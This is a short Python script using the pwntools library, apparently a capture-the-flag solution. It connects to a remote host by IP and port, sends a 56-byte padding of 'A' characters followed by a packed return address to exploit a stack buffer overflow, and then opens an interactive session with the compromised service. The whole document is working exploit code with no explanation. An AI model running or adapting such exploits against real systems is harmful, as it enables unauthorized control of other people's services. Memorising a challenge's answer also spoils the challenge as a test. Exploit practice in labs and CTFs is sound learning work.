from pwn import *

r = remote('140.110.112.29',2114)

print(r.recvline())

playload = "A"*56 + p64(0x004006b6)

r.send(playload)

r.interactive()
